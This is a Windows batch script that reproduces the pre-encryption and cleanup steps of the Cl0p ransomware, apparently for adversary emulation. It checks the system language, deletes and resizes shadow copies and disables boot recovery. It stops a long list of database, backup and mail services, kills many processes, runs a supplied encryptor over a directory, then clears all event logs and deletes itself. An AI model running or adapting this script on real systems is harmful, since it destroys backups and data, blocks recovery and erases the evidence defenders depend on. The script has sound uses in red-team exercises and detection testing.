:: Cl0p batch script for alternative steps
ECHO off
@setlocal enabledelayedexpansion

IF "%~1" == "" GOTO usage
set enc_binary=%1
set path_to_enc=%~2

set log_file="C:\Windows\temp\cl0p.bat.log"
set initial_file="Favbug.txt"


:: Language check
ECHO [INFO] Checking language.
ECHO [INFO] Checking language. >> %log_file%
FOR /F "tokens=2 delims==" %%a IN ('wmic os get OSLanguage /Value') do (SET OSLang=%%a)
FOR %%b IN (
    "082C",
    "0419",
    "0437",
) DO (
    IF "%OSLang%" == "%%~b" (
        ECHO [INFO] Install language found in exclusion list. Terminating. >> %log_file%
        EXIT /B 3
    )
)

:: Drop Initial File
ECHO [INFO] Dropping initial file.
ECHO [INFO] Dropping initial file. >> %log_file%
(type NUL > %initial_file% || ECHO [ERROR] Failed to drop intial file "%initial_file%") >> %log_file%
timeout 5 > NUL

:: Delete shadow copies, resize shadow storage
ECHO [INFO] Removing and resizing shadow copies.
ECHO [INFO] Removing and resizing shadow copies. >> %log_file%
vssadmin Delete Shadows /all /quiet
FOR %%c IN (
    "c:",
    "d:",
    "e:",
    "f:",
    "g:",
    "h:",
) DO (
    (vssadmin resize shadowstorage /for="%%~c" /on="%%~c" /maxsize=401MB || ECHO [ERROR] Failed to resize shadowstorage for "%%~c") >> %log_file%
    (vssadmin resize shadowstorage /for="%%~c" /on="%%~c" /maxsize=unbounded || ECHO [ERROR] Failed to unbound shadowstorage for "%%~c") >> %log_file%
)
vssadmin Delete Shadows /all /quiet

:: Disable boot recovery options
ECHO [INFO] Disabling boot recovery options.
ECHO [INFO] Disabling boot recovery options. >> %log_file%
(bcdedit /set {default} recoveryenabled No || ECHO [ERROR] Failed to disable boot recovery) >> %log_file%
(bcdedit /set {default} bootstatuspolicy IgnoreAllFailures || ECHO [ERROR] Failed to set IgnoreAllFailures boot policy) >> %log_file%

:: Stop services
ECHO [INFO] Stopping services.
ECHO [INFO] Stopping services. >> %log_file%
FOR %%d IN (
    "SQLAgent$SYSTEM_BGC",
    "SQLAgent$ECWDB2",
    "Zoolz 2 Service",
    "EraserSvc11710",
    "SQLAgent$PROFXENGAGEMENT",
    "MSSQLFDLauncher$TPSAMA",
    "SstpSvc",
    "MSOLAP$SQL_2008",
    "sacsvr",
    "VeeamNFSSvc",
    "VeeamTransportSvc",
    "MSSQLSERVER",
    "MSSQLServerADHelper100",
    "wbengine",
    "SQLWriter",
    "MSSQLFDLauncher$TPS",
    "ReportServer$TPSAMA",
    "MSSQL$SYSTEM_BGC",
    "VeeamBrokerSvc",
    "MSSQLFDLauncher$PROFXENGAGEMENT",
    "VeeamDeploymentService",
    "SQLAgent$TPS",
    "DCAgent",
    "MSSQLFDLauncher$SBSMONITORING",
    "MySQL80",
    "MSOLAP$SYSTEM_BGC",
    "ReportServer$TPS",
    "MSSQL$ECWDB2",
    "SQLSERVERAGENT",
    "SMTPSvc",
    "MSSQL$VEEAMSQL2008R2",
    "MSExchangeSA",
    "MSSQLServerADHelper",
    "SQLTELEMETRY",
    "POP3Svc",
    "MSOLAP$TPSAMA",
    "Veeam Backup Catalog Data Service",
    "MSSQL$SBSMONITORING",
    "ReportServer$SYSTEM_BGC",
    "MySQL57",
    "VeeamMountSvc",
    "MsDtsServer110",
    "SQLAgent$BKUPEXEC",
    "UI0Detect",
    "ReportServer",
    "SQLTELEMETRY$ECWDB2",
    "MSSQLFDLauncher$SYSTEM_BGC",
    "MSSQL$BKUPEXEC",
    "SQLAgent$PRACTTICEBGC",
    "MSExchangeSRS",
    "SQLAgent$VEEAMSQL2008R2",
    "VeeamCatalogSvc",
    "SQLAgent$SHAREPOINT",
    "NetMsmqActivator",
    "MsDtsServer",
    "SQLAgent$SQL_2008",
    "SDRSVC",
    "IISAdmin",
    "SQLAgent$PRACTTICEMGT",
    "SQLAgent$VEEAMSQL2008R2",
    "VeeamHvIntegrationSvc",
    "W3Svc",
    "SQLsafe Backup Service",
    "SQLAgent$CXDB",
    "SQLBrowser",
    "MSSQLFDLauncher$SQL_2008",
    "VeeamBackupSvc",
    "SQLAgent$VEEAMSQL2012",
    "MSExchangeMGMT",
    "SamSs",
    "MSExchangeES",
    "MSSQL$TPSAMA",
    "VeeamCloudSvc",
    "MSSQL$PRACTICEMGT",
    "SQLAgent$TPSAMA",
    "SQLAgent$SBSMONITORING",
    "MSSQL$VEEAMSQL2012",
    "SQLSafeOLRService",
    "VeeamEnterpriseManagerSvc",
    "SQLAgent$SQLEXPRESS",
    "OracleClientCache80",
    "MSSQL$PROFXENGAGEMENT",
    "IMAP4Svc",
    "MSExchangeIS",
    "MSSQLFDLauncher",
    "MSExchangeMTA",
    "SQL Backups",
    "MSSQL$TPS",
    "MsDtsServer100",
    "MSSQL$SHAREPOINT",
    "msftesql$PROD",
    "mozyprobackup",
    "MSSQL$SQL_2008",
    "SNAC",
    "ReportServer$SQL_2008",
    "MSSQL$SQLEXPRESS",
    "MSSQL$PRACTTICEBGC",
    "VeeamRESTSvc",
    "MMS",
    "RESvc",
    "MSSQL$VEEAMSQL2008R2",
    "MSSQLFDLauncher$SHAREPOINT",
    "SQLsafe Filter Service",
    "MSSQL$PROD",
    "SQLAgent$PROD",
    "MSOLAP$TPS",
    "VeeamDeploySvc",
    "MSSQLServerOLAPService",
) DO (
    (net stop "%%~d" /y) >> %log_file%
)

:: Stop Processes
ECHO [INFO] Stopping processes.
ECHO [INFO] Stopping processes >> %log_file%
FOR %%e IN (
    "agntsvc.exeagntsvc.exe",
    "AGNTSVC.EXEAGNTSVC.EXE",
    "agntsvc.exeencsvc.exe",
    "AGNTSVC.EXEENCSVC.EXE",
    "agntsvc.exeisqlplussvc.exe",
    "AGNTSVC.EXEISQLPLUSSVC.EXE",
    "dbeng50.exe",
    "DBENG50.EXE",
    "dbsnmp.exe",
    "DBSNMP.EXE",
    "scalc.exe",
    "SCALC.EXE",
    "firefoxconfig.exe",
    "FIREFOXCONFIG.EXE",
    "infopath.exe",
    "INFOPATH.EXE",
    "sbase.exe",
    "SBASE.EXE",
    "msftesql.exe",
    "MSFTESQL.EXE",
    "mydesktopqos.exe",
    "MYDESKTOPQOS.EXE",
    "mydesktopservice.exe",
    "MYDESKTOPSERVICE.EXE",
    "mysqld-nt.exe",
    "MYSQLD-NT.EXE",
    "mysqld-opt.exe",
    "MYSQLD-OPT.EXE",
    "mysqld.exe",
    "MYSQLD.EXE",
    "ocautoupds.exe",
    "OCAUTOUPDS.EXE",
    "ocomm.exe",
    "OCOMM.EXE",
    "ocssd.exe",
    "OCSSD.EXE",
    "onenote.exe",
    "ONENOTE.EXE",
    "outlook.exe",
    "OUTLOOK.EXE",
    "simpress.exe",
    "SIMPRESS.EXE",
    "sqbcoreservice.exe",
    "SQBCORESERVICE.EXE",
    "sqlagent.exe",
    "SQLAGENT.EXE",
    "sqlbroswer.exe",
    "SQLBROSWER.EXE",
    "sqlservr.exe",
    "SQLSERVR.EXE",
    "sqlwriter.exe",
    "SQLWRITER.EXE",
    "steam.exe",
    "STEAM.EXE",
    "synctime.exe",
    "SYNCTIME.EXE",
    "tbirdconfig.exe",
    "TBIRDCONFIG.EXE",
    "thebat.exe",
    "THEBAT.EXE",
    "thebat64.exe",
    "THEBAT64.EXE",
    "thunderbird.exe",
    "THUNDERBIRD.EXE",
    "sdraw.exe",
    "SDRAW.EXE",
    "swriter.exe",
    "SWRITER.EXE",
    "wordpad.exe",
    "WORDPAD.EXE",
    "xfssvccon.exe",
    "XFSSVCCON.EXE",
    "soffice.bin",
    "SOFFICE.BIN",
) DO (
    (taskkill /f /im %%e 2>&1) >> %log_file%
)

:: Perform impact
ECHO [INFO] Enumerating and encrypting files with %enc_binary%:
ECHO [INFO] Enumerating and encrypting files with %enc_binary%: >> %log_file%
%enc_binary% %path_to_enc% 2>&1 >> %log_file%

:: Clear Windows event logs
ECHO [INFO] Clearing Windows event logs
ECHO [INFO] Clearing Windows event logs >> %log_file%
FOR /F "tokens=*" %%f IN ('wevtutil.exe el') DO (
    (wevtutil.exe cl "%%f" 2>&1 && ECHO [DEBUG] Cleared event log "%%f" || ECHO [ERROR] Failed to clear event log "%%f") >> %log_file%
)

:: Delete self
ECHO [INFO] Cleaning up encryption executable and self destructing
ECHO [INFO] Cleaning up encryption executable and self destructing >> %log_file%
(del /f /q %enc_binary% 2>&1 || ECHO [ERROR] Failed to delete encryption binary at %enc_binary%) >> %log_file%
start "" /B cmd /c "timeout /nobreak 5 & del /f /q %0 2>&1 >> %log_file%" > nul

EXIT /B

:usage
ECHO Usage: cl0p.bat path_to_encryption_executable [directory_to_encrypt]
ECHO first parameter: path to minimal encryption executable
ECHO second parameter: optional, the directory containing the files to encrypt, default: C:
ECHO example: cl0p.bat C:\Users\Public\enc.exe C:\Users\Public\Documents
EXIT /B 1